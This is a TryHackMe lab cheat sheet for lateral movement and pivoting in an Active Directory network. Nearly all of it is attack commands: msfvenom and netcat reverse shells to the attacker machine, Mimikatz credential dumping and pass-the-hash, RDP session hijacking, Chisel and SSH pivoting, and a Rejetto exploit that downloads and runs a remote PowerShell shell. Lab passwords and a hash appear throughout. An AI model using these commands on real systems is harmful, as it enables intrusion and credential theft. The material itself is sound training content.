# TryHackMe — Lateral Movement and Pivoting

A corrected, compact cheat sheet for the room, with the odd commands fixed and grouped by task.

---

## 0) Lab setup

### VPN

```bash
sudo openvpn --config lateralmovementandpivoting.ovpn --daemon
```

### DNS

```bash
sudo systemd-resolve --interface lateralmovement --set-dns <THMDC_IP> --set-domain za.tryhackme.com
nslookup za.tryhackme.com
nslookup thmdc.za.tryhackme.com
```

### Jump host access

```bash
ssh 'za\t1_leonard.summers'@thmjmp2.za.tryhackme.com
ssh 'za\t2_felicia.dean'@thmjmp2.za.tryhackme.com
ssh 'za\t1_thomas.moore'@thmjmp2.za.tryhackme.com
```

---

## 1) Remote command execution primitives

### PsExec (Windows)

```cmd
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 cmd.exe
```

### PsExec (Linux / Impacket)

```bash
impacket-psexec za.tryhackme.com/Administrator:Mypass123@MACHINE_IP
```

### WinRM

```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
```

### WinRM from PowerShell with alternate credentials

```powershell
$username = 'Administrator'
$password = 'Mypass123' | ConvertTo-SecureString -AsPlainText -Force
$credential = [pscredential]::new($username, $password)
Enter-PSSession -ComputerName TARGET -Credential $credential
Invoke-Command -ComputerName TARGET -Credential $credential -ScriptBlock { Get-ComputerInfo }
```

### sc.exe remote service creation

```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET delete THMservice
```

### schtasks remote execution

```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "MyTask" /tr "powershell -command Get-ComputerInfo" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /tn "MyTask"
schtasks /s TARGET /tn "MyTask" /DELETE /F
```

### WMI / CIM remote process creation

```powershell
$username = 'user.name'
$password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force
$credential = [pscredential]::new($username, $password)
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $opt

Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c whoami > C:\Windows\Temp\whoami.txt' }
```

### Create a service over CIM

```powershell
$parameters = @{
    CimSession = $session
    ClassName = 'Win32_Service'
    MethodName = 'Create'
    Arguments = @{
        Name = 'l337service'
        DisplayName = 'l337service'
        PathName = 'net user adm1n password123 /ADD'
        ServiceType = [byte]16
        StartMode = 'Manual'
    }
}
Invoke-CimMethod @parameters
```

---

## 2) Task: Spawning processes remotely

### SSH to THMJMP2

```bash
ssh 'za\t1_leonard.summers'@thmjmp2.za.tryhackme.com
```

### Create a service-style reverse shell payload on Kali

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_VPN_IP> LPORT=443 -f exe-service -o l337pwn.exe
```

### Upload payload to THMIIS via SMB (fixed syntax)

```bash
smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put l337pwn.exe' --option='client min protocol=core'
```

### Listener on Kali

```bash
sudo nc -lnvp 443
```

### Windows PsExec example

```cmd
C:\tools\PsExec64.exe \\10.200.x.x -u za.tryhackme.com\t1_leonard.summers -p EZpass4ever cmd.exe
```

### Linux PsExec equivalent

```bash
impacket-psexec za.tryhackme.com/t1_leonard.summers:EZpass4ever@10.200.x.x
```

### If PsExec fails, try WinRM or WMI

```bash
impacket-wmiexec za.tryhackme.com/t1_leonard.summers:EZpass4ever@10.200.x.x
impacket-smbexec za.tryhackme.com/t1_leonard.summers:EZpass4ever@10.200.x.x
```

### Optional: runas /netonly trick from the jump host

```cmd
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "C:\tools\nc64.exe -e cmd.exe <KALI_VPN_IP> 443"
```

---

## 3) Task: MSI package installation via WMI

### Generate MSI payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

### Upload MSI to ADMIN$ (fixed syntax)

```bash
smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_corine.waters%Korine.1994' -c 'put l337pkg.msi' --option='client min protocol=core'
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

### Start listener

```bash
sudo nc -lnvp 4445
```

### Install remotely with msiexec

```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Invoke 

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

---

## 4) Task: Pass-the-Hash and Kerberos ticket abuse

### RDP to THMJMP2

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_felicia.dean /p:Pentesting123 +clipboard /cert:ignore
```

### Mimikatz from C:\tools

```cmd
cd C:\tools
mimikatz.exe
```

### Elevate inside Mimikatz

```text
privilege::debug
token::elevate
```

### Dump local SAM hashes

```text
lsadump::sam
```

### Dump NTLM hashes from LSASS

```text
sekurlsa::msv
```

### Start listener on Kali

```bash
sudo nc -lnvp 443
```

### Pass-the-Hash with Mimikatz

```text
token::revert
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe <KALI_VPN_IP> 443"
```

### Use the hash from Kali with Impacket WMIExec

```bash
impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

### Export Kerberos tickets

```text
sekurlsa::tickets /export
```

---

## 5) Task: Abusing user behavior

### RDP with clipboard

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG +clipboard /cert:ignore
```

### Get SYSTEM with PsExec on the jump host

```cmd
C:\tools\PsExec64.exe -accepteula -s -i cmd.exe
```

### Enumerate sessions

```cmd
query user
query session
```

### Attach to the disconnected session (replace 5 with the correct session ID)

```cmd
tscon 5 /dest:rdp-tcp#10
```

---

## 6) Task: Port forwarding with Socat / SSH

### SSH to THMJMP2

```bash
ssh 'za\t1_thomas.moore'@thmjmp2.za.tryhackme.com
```

### Socat forward on THMJMP2 to reach THMIIS RDP

```cmd
cd C:\tools\socat
socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

### RDP through the forwarded port

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 +clipboard /cert:ignore
```

### Multi-port SSH forwarding from the jump host

```cmd
ssh tunneluser@<KALI_VPN_IP> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

### Rejetto HFS exploit through the forwarded ports (Metasploit)

```text
use exploit/windows/http/rejetto_hfs_exec
set payload windows/shell_reverse_tcp
set LHOST thmjmp2.za.tryhackme.com
set ReverseListenerBindAddress 127.0.0.1
set LPORT 7878
set SRVHOST 127.0.0.1
set SRVPORT 6666
set RHOSTS 127.0.0.1
set RPORT 8888
exploit
```

---

## 7) Task: Port forwarding with Chisel

### Download Chisel on Kali

```bash
gunzip -c chisel_1.7.7_linux_amd64.gz > chisel
chmod +x ./chisel
gunzip -c chisel_1.7.7_windows_amd64.gz > chisel.exe
```

### Serve the Windows binary from Kali

```bash
sudo python3 -m http.server 80
```

### Download chisel.exe on THMJMP2

```powershell
powershell.exe
Invoke-WebRequest 'http://<KALI_VPN_IP>/chisel.exe' -OutFile .\chisel.exe
```

### Start a SOCKS5 Chisel server on THMJMP2

```powershell
$scriptblock = { Start-Process "$args\chisel.exe" -ArgumentList @('server', '--port', 50000, '--socks5') }
Start-Job -ScriptBlock $scriptblock -ArgumentList $PWD.Path
```

### Verify from Kali

```bash
sudo nmap -Pn -p50000 -T4 thmjmp2.za.tryhackme.com
```

### Open a local SOCKS tunnel on Kali

```bash
sudo ./chisel client thmjmp2.za.tryhackme.com:50000 8443:socks &
```

### RDP to THMIIS through the SOCKS proxy

```bash
xfreerdp /v:thmiis.za.tryhackme.com /u:t1_thomas.moore /p:MyPazzw3rd2020 /proxy:socks5://127.0.0.1:8443 /cert:ignore
```

### Add SOCKS proxy to proxychains

```bash
sudo nano /etc/proxychains4.conf
# add:
# socks5 127.0.0.1 8443
```

### Scan THMDC through proxychains

```bash
sudo proxychains -q nmap -Pn -sT -sV -p80 -T4 thmdc.za.tryhackme.com
```

### Start a reverse Chisel server on THMJMP2

```powershell
$scriptblock = { Start-Process "$args\chisel.exe" -ArgumentList @('server', '--port', 51000, '--reverse') }
Start-Job -ScriptBlock $scriptblock -ArgumentList $PWD.Path
```

### Create reverse forwards from Kali

```bash
sudo ./chisel client thmjmp2.za.tryhackme.com:51000 R:50080:127.0.0.1:80 R:50081:127.0.0.1:81 &
```

### Download and prepare the PowerShell reverse shell

```bash
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
# edit the file so it connects to:
# thmjmp2.za.tryhackme.com:50081
sudo python3 -m http.server 80
sudo rlwrap nc -lnvp 81
```

### Find and copy the Rejetto exploit

```bash
searchsploit Rejetto
searchsploit -m 49125
```

### Launch the exploit through proxychains

```bash
proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"
```

---

## 8) File transfer and helper commands

### Simple web server on Kali

```bash
sudo python3 -m http.server 80
```

### Download files on Windows

```powershell
Invoke-WebRequest 'http://<KALI_VPN_IP>/mimikatz.zip' -OutFile .\mimikatz.zip
Expand-Archive .\mimikatz.zip
```

### Listener helpers

```bash
sudo nc -lnvp 443
sudo nc -lnvp 4444
sudo nc -lnvp 4445
sudo rlwrap nc -lnvp 81
```

---

## 9) Fixed odd commands from common write-ups

### Wrong / awkward

```bash
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

### Correct

```bash
smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put myservice.exe'
```

### Wrong / ambiguous

```bash
ssh t1_leonard.summers@za.tryhackme.com@thmjmp2.za.tryhackme.com
```

### Correct

```bash
ssh 'za\t1_leonard.summers'@thmjmp2.za.tryhackme.com
```

### Wrong / often unreliable on Windows PsExec

```cmd
.\PsExec64.exe \\10.200.x.x -u t1_leonard.summers -p EZpass4ever -i cmd.exe
```

### Correct domain-aware version

```cmd
.\PsExec64.exe \\10.200.x.x -u za.tryhackme.com\t1_leonard.summers -p EZpass4ever cmd.exe
```

### Linux equivalent

```bash
impacket-psexec za.tryhackme.com/t1_leonard.summers:EZpass4ever@10.200.x.x
```

---

## 10) Fast review checklist

```text
[ ] Fix DNS
[ ] SSH or RDP to THMJMP2 with the task-specific account
[ ] Use PsExec / WinRM / WMI / sc / schtasks depending on the task
[ ] Upload payloads through ADMIN$ with correct smbclient syntax
[ ] Use Mimikatz for PTH and ticket export where required
[ ] Use tscon when abusing disconnected RDP sessions
[ ] Use Socat / SSH / Chisel / Proxychains for pivoting
[ ] Use Rejetto HFS exploit through the forwarded ports
```

---

## 11) Practical notes

* `ADMIN$` uploads require administrative rights on the target.
* `PsExec` works best with domain-qualified usernames.
* `-i` on PsExec is only needed for interactive desktop/session attachment.
* `xfreerdp` is less annoying with `/cert:ignore` in this lab.
* For proxied `nmap`, use `-sT`, not SYN scan.
* Keep each task’s credentials separate; the room rotates users per task.
